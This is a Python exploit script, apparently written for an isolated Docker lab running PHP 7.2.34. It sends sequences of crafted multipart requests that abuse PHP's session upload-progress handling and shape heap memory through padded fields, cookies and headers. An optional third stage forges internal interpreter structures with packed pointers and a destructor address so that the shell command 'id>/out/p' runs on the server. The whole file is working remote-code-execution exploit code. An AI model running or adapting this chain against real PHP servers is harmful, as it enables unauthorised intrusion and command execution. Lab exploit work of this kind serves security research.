#!/usr/bin/env python3
"""Fixed-target request sequences for the isolated PHP 7.2.34 Docker lab."""

from __future__ import annotations

import argparse
import socket
import struct
import time


HOST = "php2shell-72-target"
ENDPOINT = "/index.php"
SID = b"attacksessionid0001"


def multipart(parts: list[dict[str, object]], boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        out += b"--" + boundary + b"\r\n"
        for key, value in part.get("pre_headers", []):
            out += bytes(key) + b":"
            if value:
                out += b" " + bytes(value)
            out += b"\r\n"
        out += b'Content-Disposition: form-data; name="' + bytes(part["name"]) + b'"'
        if part.get("filename") is not None:
            out += b'; filename="' + bytes(part["filename"]) + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + bytes(part["data"]) + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def post(
    body: bytes,
    boundary: bytes,
    timeout: float = 60.0,
    extra_headers: bytes = b"",
) -> bytes:
    header = (
        f"POST {ENDPOINT} HTTP/1.1\r\nHost: {HOST}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
    ).encode() + extra_headers + b"Connection: close\r\n\r\n"
    with socket.create_connection((HOST, 80), 10) as sock:
        sock.settimeout(timeout)
        try:
            sock.sendall(header)
            view = memoryview(body)
            for offset in range(0, len(body), 262144):
                sock.sendall(view[offset : offset + 262144])
        except OSError:
            return b""
        chunks: list[bytes] = []
        try:
            while True:
                data = sock.recv(65536)
                if not data:
                    break
                chunks.append(data)
        except OSError:
            pass
        return b"".join(chunks)


def status(response: bytes) -> bytes:
    return response.partition(b"\r\n")[0]


def producer(pad_count: int) -> bytes:
    parts: list[dict[str, object]] = [
        {"name": b"PHPSESSID", "data": b"a" * 19},
        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for index in range(pad_count):
        parts.append({"name": f"p{index:06d}"[:7].encode(), "data": b"V" * 7})
    parts += [
        {"name": b"f", "filename": b"a.txt", "data": b"A" * 64},
        {"name": b"big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    return post(multipart(parts, b"S" * 17), b"S" * 17, 120)


def fileless_consumer(
    count: int,
    value_len: int,
    bump_count: int,
    bump_len: int,
    extra2_count: int,
    extra2_len: int,
    extra_count: int,
    extra_len: int,
    nested_depth: int,
    tail_len: int,
    tail_name_len: int,
    tail_nested_depth: int,
    cookie_pairs: int,
    cookie_len: int,
    cookie_extra_name_len: int,
    cookie_extra_value_len: int,
    pre_fields: int,
    pre_field_name_len: int,
    pre_field_value_len: int,
    pre_field_nested_depth: int,
    pre_files: int,
    pre_file_name_len: int,
    pre_filename_len: int,
    pre_file_data_len: int,
    progress_value_len: int,
    sid_len: int,
    fill: bytes,
    sid_pre_headers: list[tuple[bytes, bytes]] | None = None,
    pre_field_values: list[bytes] | None = None,
    pre_field_names: list[bytes] | None = None,
    boundary_len: int = 10,
) -> bytes:
    sid_value = (SID * ((sid_len + len(SID) - 1) // len(SID)))[:sid_len]
    sid_part: dict[str, object] = {"name": b"PHPSESSID", "data": sid_value}
    if sid_pre_headers:
        sid_part["pre_headers"] = sid_pre_headers
    parts: list[dict[str, object]] = [sid_part]
    for index in range(pre_fields):
        if pre_field_names is not None and index < len(pre_field_names):
            name = pre_field_names[index]
        else:
            prefix = f"q{index:04d}".encode()
            name = prefix.ljust(pre_field_name_len, b"Q")
            name += b"[a]" * pre_field_nested_depth
        data = (
            pre_field_values[index]
            if pre_field_values is not None and index < len(pre_field_values)
            else fill * pre_field_value_len
        )
        parts.append({"name": name, "data": data})
    for index in range(pre_files):
        prefix = f"pf{index:04d}".encode()
        name = prefix.ljust(pre_file_name_len, b"N")
        filename = f"fn{index:04d}".encode().ljust(pre_filename_len, b"F")
        parts.append({"name": name, "filename": filename,
                      "data": fill * pre_file_data_len})
    progress_value = (b"pwn" * ((progress_value_len + 2) // 3))[:progress_value_len]
    parts.append({"name": b"PHP_SESSION_UPLOAD_PROGRESS", "data": progress_value})
    extra = fill.lower() * extra_len
    for index in range(extra_count):
        name = f"e{index:04d}".encode() + b"[a]" * nested_depth
        parts.append({"name": name, "data": extra})
    extra2 = fill.upper() * extra2_len
    for index in range(extra2_count):
        parts.append({"name": f"h{index:04d}".encode(), "data": extra2})
    bump = fill * bump_len
    for index in range(bump_count):
        parts.append({"name": f"j{index:04d}".encode(), "data": bump})
    value = fill * value_len
    for index in range(count):
        parts.append({"name": f"s{index:04d}".encode(), "data": value})
    if tail_len:
        tail_name = b"tail".ljust(tail_name_len, b"T")
        tail_name += b"[a]" * tail_nested_depth
        parts.append({"name": tail_name, "data": fill.lower() * tail_len})
    boundary = b"B" * boundary_len
    cookie = b""
    if cookie_pairs:
        pairs = []
        for index in range(cookie_pairs):
            name = f"c{index:03d}".encode().ljust(cookie_len, b"n")
            value = f"v{index:03d}".encode().ljust(cookie_len, b"K")
            pairs.append(name + b"=" + value)
        if cookie_extra_name_len or cookie_extra_value_len:
            name = b"x" * cookie_extra_name_len
            value = b"Y" * cookie_extra_value_len
            pairs.append(name + b"=" + value)
        cookie = b"Cookie: " + b"; ".join(pairs) + b"\r\n"
    return post(multipart(parts, boundary), boundary, extra_headers=cookie)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--count", type=int, default=400)
    parser.add_argument("--value-len", type=int, default=4071)
    parser.add_argument("--bump-count", type=int, default=0)
    parser.add_argument("--bump-len", type=int, default=8167)
    parser.add_argument("--tail-len", type=int, default=0)
    parser.add_argument("--tail-name-len", type=int, default=4)
    parser.add_argument("--tail-nested-depth", type=int, default=0)
    parser.add_argument("--extra-count", type=int, default=0)
    parser.add_argument("--extra-len", type=int, default=0)
    parser.add_argument("--nested-depth", type=int, default=0)
    parser.add_argument("--cookie-pairs", type=int, default=0)
    parser.add_argument("--cookie-len", type=int, default=31)
    parser.add_argument("--cookie-extra-name-len", type=int, default=0)
    parser.add_argument("--cookie-extra-value-len", type=int, default=0)
    parser.add_argument("--pre-files", type=int, default=0)
    parser.add_argument("--pre-fields", type=int, default=0)
    parser.add_argument("--pre-field-name-len", type=int, default=7)
    parser.add_argument("--pre-field-value-len", type=int, default=1)
    parser.add_argument("--pre-field-nested-depth", type=int, default=0)
    parser.add_argument("--pre-file-name-len", type=int, default=7)
    parser.add_argument("--pre-filename-len", type=int, default=7)
    parser.add_argument("--pre-file-data-len", type=int, default=1)
    parser.add_argument("--progress-value-len", type=int, default=3)
    parser.add_argument("--sid-len", type=int, default=len(SID))
    parser.add_argument("--extra2-count", type=int, default=0)
    parser.add_argument("--extra2-len", type=int, default=0)
    parser.add_argument("--producer-pads", type=int, default=32)
    parser.add_argument("--third", action="store_true")
    parser.add_argument("--third-sid-len", type=int, default=len(SID))
    parser.add_argument("--third-pre-fields", type=int, default=0)
    parser.add_argument("--third-pre-field-name-len", type=int, default=7)
    parser.add_argument("--third-pre-field-value-len", type=int, default=1)
    parser.add_argument("--third-pre-field-nested-depth", type=int, default=0)
    parser.add_argument("--third-header-seed-len", type=int, default=0)
    parser.add_argument("--third-header-spray-count", type=int, default=0)
    parser.add_argument("--third-header-key-len", type=int, default=40)
    parser.add_argument("--third-header-target-value-len", type=int, default=1)
    parser.add_argument("--third-header-fill-all", action="store_true")
    parser.add_argument("--third-fake-main", type=lambda value: int(value, 0), default=0)
    parser.add_argument("--third-fake-pdestructor", type=lambda value: int(value, 0), default=0)
    parser.add_argument("--third-fake-page-offset", type=lambda value: int(value, 0), default=0x6A000)
    parser.add_argument("--third-donor-offset", type=lambda value: int(value, 0), default=0x6A0A8)
    parser.add_argument("--delay", type=float, default=0.25)
    args = parser.parse_args()
    for name in (
        "count", "value_len", "bump_count", "bump_len", "extra2_count", "extra2_len",
        "extra_count", "extra_len", "nested_depth", "tail_len",
        "tail_name_len", "tail_nested_depth",
        "cookie_pairs", "cookie_len", "cookie_extra_name_len",
        "cookie_extra_value_len", "producer_pads"
        , "pre_files", "pre_file_name_len", "pre_filename_len",
        "pre_file_data_len", "pre_fields", "pre_field_name_len",
        "pre_field_value_len", "pre_field_nested_depth"
        , "progress_value_len"
        , "sid_len", "third_sid_len", "third_pre_fields",
        "third_pre_field_name_len", "third_pre_field_value_len",
        "third_pre_field_nested_depth", "third_header_seed_len",
        "third_header_spray_count", "third_header_key_len",
        "third_header_target_value_len"
        , "third_fake_main", "third_fake_pdestructor", "third_fake_page_offset",
        "third_donor_offset"
    ):
        value = getattr(args, name)
        maximum = (
            (1 << 64) - 1
            if name in {"third_fake_main", "third_fake_pdestructor", "third_donor_offset"}
            else 20_000_000
        )
        if value < 0 or value > maximum:
            raise SystemExit(f"invalid {name}")

    response = producer(args.producer_pads)
    print("A", status(response), len(response), flush=True)
    time.sleep(args.delay)
    response = fileless_consumer(
        args.count,
        args.value_len,
        args.bump_count,
        args.bump_len,
        args.extra2_count,
        args.extra2_len,
        args.extra_count,
        args.extra_len,
        args.nested_depth,
        args.tail_len,
        args.tail_name_len,
        args.tail_nested_depth,
        args.cookie_pairs,
        args.cookie_len,
        args.cookie_extra_name_len,
        args.cookie_extra_value_len,
        args.pre_fields,
        args.pre_field_name_len,
        args.pre_field_value_len,
        args.pre_field_nested_depth,
        args.pre_files,
        args.pre_file_name_len,
        args.pre_filename_len,
        args.pre_file_data_len,
        args.progress_value_len,
        args.sid_len,
        b"C",
    )
    print("B", status(response), len(response), flush=True)
    if args.third:
        time.sleep(args.delay)
        third_headers: list[tuple[bytes, bytes]] = []
        if args.third_header_seed_len:
            third_headers.append((b"Z" * args.third_header_seed_len, b""))
        if args.third_header_spray_count:
            if args.third_header_fill_all:
                third_headers.extend(
                    (
                        b"X" * args.third_header_key_len,
                        b"V" * args.third_header_target_value_len,
                    )
                    for _ in range(args.third_header_spray_count)
                )
            else:
                empty_count = max(0, args.third_header_spray_count - 1)
                third_headers.extend(
                    (b"X" * args.third_header_key_len, b"")
                    for _ in range(empty_count)
                )
                third_headers.append((
                    b"T" * args.third_header_key_len,
                    b"V" * args.third_header_target_value_len,
                ))
        third_values: list[bytes] | None = None
        third_names: list[bytes] | None = None
        if args.third_fake_main:
            page = args.third_fake_main + args.third_fake_page_offset
            outer = struct.pack("<IIQII", 1, 0xA, page + 0x38, 0x1407, 0)
            fake_prefix = struct.pack(
                "<IIIIQ",
                1,
                0x8007,
                0x10,
                0,
                args.third_fake_main + args.third_donor_offset,
            )
            first_full = outer + b"P" * 8 + fake_prefix
            if len(first_full) != 56 or first_full[-1] != 0:
                raise SystemExit("fake first carrier must end in an implicit NUL")
            first = first_full[:-1]
            setup = b"A" * 55
            second = struct.pack("<Q", args.third_fake_pdestructor) + b"E" * 47
            command = b"id>/out/p"
            execute_data = bytearray(96)
            struct.pack_into("<I", execute_data, 8, 6)
            struct.pack_into("<Q", execute_data, 0x10, len(command))
            execute_data[0x18:0x18 + len(command) + 1] = command + b"\x00"
            struct.pack_into("<I", execute_data, 0x2C, 1)
            donor = args.third_fake_main + args.third_donor_offset
            struct.pack_into("<Q", execute_data, 0x50, donor)
            struct.pack_into("<I", execute_data, 0x58, 6)
            third_values = [setup, second, first, bytes(execute_data)]
            duplicate = b"q0000".ljust(args.third_pre_field_name_len, b"Q")
            third_names = [
                duplicate,
                duplicate,
                b"q0001".ljust(args.third_pre_field_name_len, b"Q"),
                b"q0002".ljust(args.third_pre_field_name_len, b"Q"),
            ]
        response = fileless_consumer(
            count=0,
            value_len=0,
            bump_count=0,
            bump_len=0,
            extra2_count=0,
            extra2_len=0,
            extra_count=0,
            extra_len=0,
            nested_depth=0,
            tail_len=0,
            tail_name_len=4,
            tail_nested_depth=0,
            cookie_pairs=0,
            cookie_len=31,
            cookie_extra_name_len=0,
            cookie_extra_value_len=0,
            pre_fields=len(third_values) if third_values is not None else args.third_pre_fields,
            pre_field_name_len=args.third_pre_field_name_len,
            pre_field_value_len=args.third_pre_field_value_len,
            pre_field_nested_depth=args.third_pre_field_nested_depth,
            pre_files=0,
            pre_file_name_len=7,
            pre_filename_len=7,
            pre_file_data_len=1,
            progress_value_len=3,
            sid_len=args.third_sid_len,
            fill=b"D",
            sid_pre_headers=third_headers,
            pre_field_values=third_values,
            pre_field_names=third_names,
        )
        print("C", status(response), len(response), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
